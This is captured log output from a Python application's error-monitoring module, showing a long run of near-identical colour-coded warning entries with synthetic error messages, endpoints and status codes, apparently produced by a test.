WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1378'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760134Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1379'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760184Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1380'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760234Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1381'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760320Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1382'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1383'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760469Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1384'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760523Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1385'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760575Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1386'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1387'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760678Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1388'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760728Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1389'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760777Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1390'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760828Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1391'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760884Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1392'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760938Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1393'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.760989Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1394'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761116Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1395'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761189Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1396'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1397'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1398'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761352Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m28[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1399'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1400'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761458Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1401'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761506Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1402'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761555Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1403'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761603Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1404'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761690Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1405'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761775Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1406'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761835Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1407'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761887Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1408'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761937Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1409'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.761989Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1410'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762039Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1411'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762088Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1412'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1413'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762308Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1414'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762376Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1415'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762435Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1416'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762487Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1417'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
